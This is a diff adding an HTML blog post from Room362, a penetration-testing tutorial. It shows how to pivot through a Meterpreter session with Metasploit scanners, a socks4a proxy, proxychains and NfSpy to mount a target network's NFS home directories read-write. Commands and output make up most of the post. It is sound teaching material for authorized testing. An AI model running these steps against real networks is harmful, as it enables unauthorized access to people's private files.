@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Mounting NFS shares through Meterpreter with NfSpy &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Mounting NFS shares through Meterpreter with NfSpy</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>You&rsquo;ve found an NFS share on a pentest, it&rsquo;s sharing out your target&rsquo;s home directories (/home) and some SAN with all of the Windows AD users &ldquo;home&rdquo; directories under /volumes/users/. You only have a meterpreter session though&hellip; enough back story, problem is that Metasploit doesn&rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&rsquo;m wrong, but there also aren&rsquo;t any tools for talking to NFS shares over TCP only proxies.</p>
+
+<p>Enter NfSpy: <a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p>
+
+<p>While it&rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.</p>
+
+<p>First we setup up our route so that the aux module will go over the meterpreter session:</p>
+
+<pre><code>route add 192.168.1.0 255.255.255.0 1
+</code></pre>
+
+<p>The 1 on the end being the meterpreter session number it&rsquo;s going to be going through. Next up is to find out what exports are available:</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &gt; show options
+
+Module options (auxiliary/scanner/nfs/nfsmount):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&lt;
+
+msf auxiliary(nfsmount) &gt; set RHOSTS 192.168.1.50
+RHOSTS =&gt; 192.168.1.50
+msf auxiliary(nfsmount) &gt; run
+[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
+[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
+</code></pre>
+
+<p>Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/misc/sunrpc_portmapper
+msf auxiliary(sunrpc_portmapper) &gt; show options
+
+Module options (auxiliary/scanner/misc/sunrpc_portmapper):
+
+   Name     Current Setting  Required  Description&lt;
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+msf auxiliary(sunrpc_portmapper) &gt; set RHOSTS 192.168.1.50
+RHOSTS =&gt; 192.168.1.50
+msf auxiliary(sunrpc_portmapper) &gt; run
+
+[+] 192.168.1.50 - Programs available
+        rpcbind - 111/tcp
+        rpcbind - 111/udp
+        status - 46797/udp
+        status - 55731/tcp
+        nfs - 2049/tcp
+        nfs_acl - 2049/tcp
+        nfs - 2049/udp
+        nfs_acl - 2049/udp
+        nlockmgr - 54167/udp
+        nlockmgr - 38216/tcp
+        mountd - 52569/udp&lt;
+        mountd - 37719/tcp
+        mountd - 39099/udp
+        mountd - 55763/tcp
+        mountd - 37808/udp
+        mountd - 54457/tcp
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&rsquo;s socks proxy:</p>
+
+<pre><code>msf &gt; use auxiliary/server/socks4a
+msf auxiliary(socks4a) &gt; show options
+
+Module options (auxiliary/server/socks4a):
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The address to listen on
+  SRVPORT  1080             yes       The port to listen on.
+
+msf auxiliary(socks4a) &gt; set SRVPORT 9050
+SRVPORT =&gt; 9050
+msf auxiliary(socks4a) &gt; set SRVHOST 127.0.0.1
+SRVHOST =&gt; 127.0.0.1
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+</code></pre>
+
+<p>I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.</p>
+
+<p>Next up it actually using nfspy (create or prep a directory so you can mount it first):</p>
+
+<pre><code>proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
+ProxyChains-3.1 (http://proxychains.sf.net)
+FUSE library version: 2.8.6
+nullpath_ok: 0
+unique: 1, opcode: INIT (26), nodeid: 0, insize: 56
+INIT: 7.16
+flags=0x0000007b
+max_readahead=0x00020000
+|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-192.168.1.50:37719-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-192.168.1.50:2049-&lt;&gt;&lt;&gt;-OK
+  INIT: 7.12
+  flags=0x00000011
+  max_readahead=0x00020000
+  max_write=0x00020000
+  unique: 1, success, outsize: 40
+</code></pre>
+
+<p><code>proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount</code></p>
+
+<p>Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&rsquo;ll just be waiting as there isn&rsquo;t really a time out and Proxychains doesn&rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.</p>
+
+<p>If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:</p>
+
+<pre><code>ls /root/nfspy/mount
+user1
+user2
+user3
+user4
+</code></pre>
+
+<p>Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:</p>
+
+<pre><code>unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
+   unique: 166, success, outsize: 32
+unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80
+readdir[0] from 0
+   unique: 167, success, outsize: 208
+unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user3
+getattr /home/user3
+   NODEID: 40
+   unique: 168, success, outsize: 144
+unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user1
+getattr /home/user1
+   NODEID: 41
+   unique: 169, success, outsize: 144
+unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user4
+getattr /home/user4
+   NODEID: 42
+   unique: 170, success, outsize: 144
+unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46
+LOOKUP /home/user2
+getattr /home/user2
+   NODEID: 43
+   unique: 171, success, outsize: 144
+</code></pre>
+
+<p>Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.</p>
+
+<p>Last note, you can&rsquo;t just CTRL-C an nfspy mount, you need to use <code>fusermount -u /root/nfspy/mount</code> to kill it. It&rsquo;s another fuse issue. If anyone has a better way to do this I&rsquo;m all ears.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
